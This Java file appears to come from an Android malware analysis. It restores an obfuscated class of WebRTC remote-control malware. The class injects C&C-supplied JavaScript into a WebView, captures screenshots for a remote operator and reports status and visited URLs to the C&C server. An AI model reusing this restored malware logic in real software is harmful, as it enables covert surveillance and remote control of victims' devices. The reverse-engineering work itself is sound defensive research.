package touch;

import android.graphics.Bitmap;
import android.util.Log;
import android.webkit.WebView;

import c13.nim5.ez8.h5_proto.signaling.UpdateSignalingStatusRequest;
import c13.nim5.ez8.h5_proto.signaling.UpdateSignalingStatusResponse;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.UUID;

/**
 * MALWARE ANALYSIS - RESTORED FROM OBFUSCATED CLASS: lIllIlIll1.IllIIlIIII1
 *
 * Signaling-mode task implementation for WebRTC remote control.
 * Extends WebViewAutomationBase to operate when a remote operator is connected via WebRTC.
 *
 * Key behaviors:
 * - Creates a WebRTCController for real-time screen capture and remote control
 * - Reports signaling status changes (IN_LANDING, PEER_CONNECTED, etc.) to C&C server
 * - Gates page-loaded state on the IN_LANDING status report
 * - Captures screenshots via WebRTCController (not local bitmap capture)
 * - Extends cleanup to also stop the WebRTCController
 *
 * Original obfuscated name: lIllIlIll1.IllIIlIIII1
 */
public class SignalingModeTask extends WebViewAutomationBase {

    private static final String TAG = "SignalingModeTask";

    /**
     * Set to true after the IN_LANDING status has been successfully reported to C&C.
     * Used to gate {@link #isMainPageLoaded()} — the page is not considered "loaded"
     * until IN_LANDING is reported, preventing premature JS injection.
     */
    public boolean inLandingReported;

    /**
     * The WebRTC controller instance for screen capture and remote control.
     * Created in {@link #onWebViewReady()} with a random UUID session identifier.
     * Original type: llIIIIlIlllIII1.IllIIlIIII1 (WebRTCController)
     */
    public Object /* WebRTCController */ webRTCController;

    // =========================================================================
    // Inner Classes
    // =========================================================================

    /**
     * Runnable that retrieves the current WebView URL on the UI thread.
     * Used by {@link #updateSignalStatus(int)} to include the current URL
     * in signaling status reports.
     *
     * Original obfuscated name: lIIIIlllllIlll1
     */
    public class GetUrlRunnable implements Runnable {

        /** Holds the result URL string (single-element array for thread-safe return). */
        public final String[] resultHolder;

        /** The signaling status being reported. */
        public final UpdateSignalingStatusRequest.Status status;

        public GetUrlRunnable(UpdateSignalingStatusRequest.Status status, String[] resultHolder) {
            this.status = status;
            this.resultHolder = resultHolder;
        }

        @Override
        public void run() {
            if (this.status == UpdateSignalingStatusRequest.Status.IN_LANDING) {
                // Only include the URL for IN_LANDING status
                this.resultHolder[0] = SignalingModeTask.this.webView.getUrl() != null
                        ? SignalingModeTask.this.webView.getUrl() : "";
            } else {
                this.resultHolder[0] = "";
            }
        }
    }

    /**
     * Cleanup runnable that extends the parent cleanup to also stop the WebRTCController.
     * Posted to the main thread during task shutdown.
     *
     * Original obfuscated name: llllIIIIll1
     */
    public class SignalingCleanupRunnable implements Runnable {

        public SignalingCleanupRunnable() {
        }

        @Override
        public void run() {
            // Call parent cleanup (removes JS interface, destroys WebView)
            SignalingModeTask.super.cleanup();
            try {
                // Also stop the WebRTCController
                // Original: webRTCController.IIIlIllIlI1() → webRTCController.stop()
                WebRTCController controller = (WebRTCController) SignalingModeTask.this.webRTCController;
                if (controller != null) {
                    controller.stop();
                }
            } catch (Throwable th) {
                Log.e(TAG, "destroy error2: " + th);
            }
        }
    }

    /**
     * Callback for signaling status update API responses.
     * Logs success/failure and marks IN_LANDING as reported on success.
     *
     * Original obfuscated name: llllIllIl1
     */
    public class StatusUpdateCallback /* implements SignalingStatusCallback */ {

        /** The status that was reported. */
        public final UpdateSignalingStatusRequest.Status status;

        public StatusUpdateCallback(UpdateSignalingStatusRequest.Status status) {
            this.status = status;
        }

        /**
         * Called when the status update API call completes.
         *
         * @param response the server response, or null if an error occurred
         * @param error    the exception, or null on success
         */
        public void onCompleted(UpdateSignalingStatusResponse response, Exception error) {
            if (error != null) {
                Log.e(TAG, "updateSignalingStatus error!!: " + error);
            } else {
                Log.i(TAG, "updateSignalingStatus success");
            }
            Log.i(TAG, "updateSignalingStatus onCompleted");
            // Mark IN_LANDING as reported so isMainPageLoaded() returns true
            if (this.status == UpdateSignalingStatusRequest.Status.IN_LANDING) {
                SignalingModeTask.this.inLandingReported = true;
            }
        }
    }

    // =========================================================================
    // Constructor
    // =========================================================================

    /**
     * Constructs a SignalingModeTask.
     *
     * @param webView    the WebView to automate
     * @param configJson task configuration JSON from C&C
     * @param jsScript   the JavaScript code to inject into pages
     */
    public SignalingModeTask(WebView webView, JSONObject configJson, String jsScript)
            throws JSONException {
        super(webView, configJson, jsScript);
        this.inLandingReported = false;
    }

    // =========================================================================
    // WebViewAutomationBase abstract method implementations
    // =========================================================================

    /**
     * Returns whether the main page is considered "loaded".
     * In signaling mode, the page is NOT loaded until the IN_LANDING status
     * has been successfully reported to the C&C server.
     *
     * @return true if IN_LANDING has NOT yet been reported (page still loading)
     */
    @Override
    public boolean isMainPageLoaded() {
        return !this.inLandingReported;
    }

    /**
     * Performs cleanup by posting a SignalingCleanupRunnable to the main thread.
     * This ensures both the WebView and WebRTCController are properly shut down.
     */
    @Override
    public void cleanup() {
        // Post cleanup to main thread
        // Original: IlIlllIIlI1.lIIIIlllllIlll1.llllIIIIll1(new SignalingCleanupRunnable());
        AppContext.postToMainThread(new SignalingCleanupRunnable());
    }

    /**
     * Checks whether WebRTC signaling is currently active.
     * Delegates to the AppContext's signaling connection status.
     *
     * @return true if signaling is active
     */
    @Override
    public boolean isSignalingActive() {
        // Original: return IlIlllIIlI1.lIIIIlllllIlll1.IlIllIlllIllI1().IIlIllIIll1();
        return AppContext.getSignalingConnection().isConnected();
    }

    /**
     * Called when the WebView is ready. Creates a WebRTCController with a random UUID
     * as the session identifier, and schedules a 500ms delay before task execution begins.
     */
    @Override
    public void onWebViewReady() {
        // Create WebRTCController with a random session UUID
        // Original: this.f474lIlllIIIII1 = new llIIIIlIlllIII1.IllIIlIIII1(UUID.randomUUID().toString(), this);
        this.webRTCController = new WebRTCController(UUID.randomUUID().toString(), this);
        // Original: IIlIllIIll1.llllIIIIll1(500L);
        PreferencesHelper.scheduleDelay(500L);
    }

    /**
     * Captures a screenshot using the WebRTCController with a 1-second timeout.
     *
     * @param webView the WebView (unused; screenshot is taken via WebRTCController)
     * @return the captured Bitmap, or null if the controller is not initialized
     */
    @Override
    public Bitmap captureScreenshot(WebView webView) {
        // Original: illIIlIIII1.llllIIIIll1(1000L) → captureScreenshot(1000L)
        WebRTCController controller = (WebRTCController) this.webRTCController;
        if (controller != null) {
            return controller.captureScreenshot(1000L);
        }
        return null;
    }

    /**
     * Reports a signaling status change to the C&C server.
     *
     * The method:
     * 1. Converts the status code to a Status enum
     * 2. Skips duplicate IN_LANDING reports
     * 3. Gets the current WebView URL on the UI thread (for IN_LANDING status)
     * 4. Sends the status update to C&C with a StatusUpdateCallback
     *
     * @param statusCode the signaling status code (maps to UpdateSignalingStatusRequest.Status)
     */
    @Override
    public void updateSignalStatus(int statusCode) {
        try {
            UpdateSignalingStatusRequest.Status status =
                    UpdateSignalingStatusRequest.Status.fromValue(statusCode);

            // Skip if IN_LANDING was already reported
            if (this.inLandingReported && status == UpdateSignalingStatusRequest.Status.IN_LANDING) {
                return;
            }

            Log.i(TAG, "updateSignalStatus: " + statusCode);

            // Get current URL on UI thread (only populated for IN_LANDING status)
            // Original: IlIlllIIlI1.lIIIIlllllIlll1.lIIIIlllllIlll1(new lIIIIlllllIlll1(fromValue, strArr));
            String[] urlHolder = new String[1];
            AppContext.runOnMainThreadSync(new GetUrlRunnable(status, urlHolder));
            String currentUrl = urlHolder[0];

            Log.i(TAG, "updateSignalStatus url: " + statusCode + ", url: " + currentUrl);

            // Send status update to C&C via signaling connection
            // Original: IlIlllIIlI12.llllIIIIll1(IlIllIlllIllI1(), fromValue, str, new llllIllIl1(fromValue));
            Object /* SignalingConnection */ signalingConnection =
                    AppContext.taskConfig.getSignalingConnection();
            if (signalingConnection != null) {
                ((SignalingConnection) signalingConnection).updateSignalingStatus(
                        getOfferId(), status, currentUrl, new StatusUpdateCallback(status));
            }
        } catch (Exception e) {
            Log.e(TAG, "updateSignalingStatus error: " + e);
        }
    }

    // =========================================================================
    // Placeholder types for unrestored dependencies
    // =========================================================================

    /*
     * WebRTCController (llIIIIlIlllIII1.IllIIlIIII1):
     *   - Constructor: WebRTCController(String sessionId, SignalingModeTask task)
     *   - Bitmap captureScreenshot(long timeoutMs) — captures screen via WebRTC
     *   - void stop() — stops the WebRTC controller and releases resources
     *
     * AppContext (IlIlllIIlI1.lIIIIlllllIlll1):
     *   - static SignalingConnection getSignalingConnection()
     *   - static void postToMainThread(Runnable)
     *   - static void runOnMainThreadSync(Runnable)
     *   - static TaskConfig taskConfig
     *
     * SignalingConnection (IlIlIIlIII1.lIIIIlllllIlll1):
     *   - boolean isConnected()
     *   - void updateSignalingStatus(String offerId, Status status, String url, Callback callback)
     *
     * PreferencesHelper (IlIlIIIlIlIlll1.IIlIllIIll1):
     *   - static void scheduleDelay(long millis) — schedules a delay before task execution
     */
}
